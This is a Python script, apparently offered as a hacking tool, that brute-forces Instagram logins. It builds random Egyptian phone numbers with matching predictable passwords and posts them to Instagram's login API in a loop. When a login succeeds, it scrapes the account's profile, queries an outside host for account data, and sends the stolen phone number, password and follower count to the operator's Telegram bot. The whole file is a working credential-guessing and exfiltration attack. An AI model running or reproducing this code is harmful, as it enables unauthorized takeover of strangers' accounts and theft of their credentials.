import webbrowser
webbrowser.open('https://t.me/E_D_I')
Z = '\x1b[1;31m'
A = '\x1b[1;33m'
Z1 = '\x1b[2;31m'
F = '\x1b[2;32m'
X = '\x1b[2;34m'
C = '\x1b[2;35m'
S = '\x1b[2;36m'
Y = '\x1b[1;34m'
try:
    import os
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
    os.system('clear')
    aa = 0
    zz = 0
    import time
    timee = time.asctime()
    t = time.localtime()
    current_time = time.strftime('%R:%O:% VE', t)

    def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.1)



    ID = input('ادخل ال ايدي الخاص بك: ')
    tok = input('ادخل التوكن الخاص بك: ') 

def code_joo(userQ, password):
    cookie = secrets.token_hex(8) * 2
    head = {'HOST':'www.instagram.com',  'KeepAlive':'True', 
     'UserAgent':'Mozilla/5.0 (Linux; Android 11; RMX2001 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
     'Cookie':cookie, 
     'Accept':'*/*', 
     'ContentType':'aapplication/x-www-form-urlencoded', 
     'X-Requested-With':'XMLHttpRequest', 
     'X-IG-App-ID':'1217981644879628', 
     'X-Instagram-AJAX':'05272981ffad', 
     'X-CSRFToken':'BbxqCAh0V6XVYW0UAi1ZWAtEMNfdIUX9', 
     'Accept-Language':'en-US,en;q=0.9'}
    url_id = f"https://www.instagram.com/{userQ}/?__a=1"
    req_id = requests.get(url_id, headers=head).json()
    name = str(req_id['graphql']['user']['full_name'])
    id = str(req_id['graphql']['user']['id'])
    followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
    following = str(req_id['graphql']['user']['edge_follow']['count'])
    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
    ree = re.json()
    dat = ree['data']
    t = time.localtime()
    current_time = time.strftime('%S:%TA:%RK', t)
    joo3 = f"HUNT BY KAMAL.𖤝  ︎\n◆━━━━━━◆❃◆━━━━━━◆ \n😱 ➥•𝑬𝒎𝒂𝒊𝒍 : {username}\n✅ ➥•𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅 : {password}\n𝒖𝒔𝒆𝒓 𖠛 : {userQ}\n𝒇𝒐𝒍𝒍𝒐𝒘𝒊𝒏𝒔 𖠏 :  {followes}\n⏱ ➥•𝑻𝒊𝒎𝒆 : {dat}\n ◆━━━━━━◆❃◆━━━━━━◆\n:ᯓ CH @E_D_I @vVv_Ve BY @E_2_P "
    tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {joo3} \n"
    i = requests.post(tlg)


url = 'https://i.instagram.com/api/v1/accounts/login/'
headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
sleep(1)
sleep(0.1)
user = '0987654321'
while True:
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '+20100' + us
        password = '0100'+ us
        from uuid import uuid4
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username,
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        if 'logged_in_user' in req.json():
            zz += 1
            userQ = req.json()['logged_in_user']['username']
            code_joo(userQ, password)
        elif '"message":"challenge_required","challenge"' in req.json():
            os.system('cls' if os.name == 'nt' else 'clear')
            print(Z1+f"\r                 \n [=] Hit : {zz} \n [=] Bad : {aa} \n [=] Scure :  \n [=] Block : \n [=] User : {username} \n [=] Pass : {password} ",end='')
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print (Z1+"")
            print (X+"")
            print (X+" ")
            print (Z1+"")
            print(C+f"\r                 \n {F}[=] Hit : {zz} \n {Z1}[=] Bad : {aa} {S}\n{A} [=] Scure :  \n {X}[=] Block : \n {C}[=] User : {username} \n{Z} [=] Pass : {password} ",end='')
            aa += 1